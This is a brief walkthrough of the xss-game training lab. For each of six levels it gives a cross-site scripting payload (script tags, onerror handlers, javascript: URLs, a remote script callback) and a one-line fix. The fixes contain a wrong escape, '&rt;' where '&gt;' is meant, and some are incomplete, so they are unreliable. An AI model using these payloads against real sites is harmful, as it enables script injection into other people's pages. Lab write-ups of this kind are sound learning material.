Level 1:
	Vulnerability: submit <script>alert()</script> in input#query
	Solution: map HTML Tag characters ('<' -> '&lt;', '>' -> '&rt;')

Level 2:
	Vulnerability: submit <img src="http://inexist.ent" onerror="javascript:alert()"/> in textarea
	Solution: map HTML Tag characters ('<' -> '&lt;', '>' -> '&rt;')

Level 3:
	Vulnerability: navigate to https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)';
	Solution: map HTML Tag characters ('<' -> '&lt;', '>' -> '&rt;')

Level 4:
	Vulnerability: submit form with "');alert('"
	Solution: parse timer to int

Level 5:
	Vulnerability: navigate to https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert() and click 'Next >>'
	Solution: do not share 'next' query parameter between pages

Level 6:
	Vulnerability: navigate to https://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback=alert
	Solution: modify regexp within index.html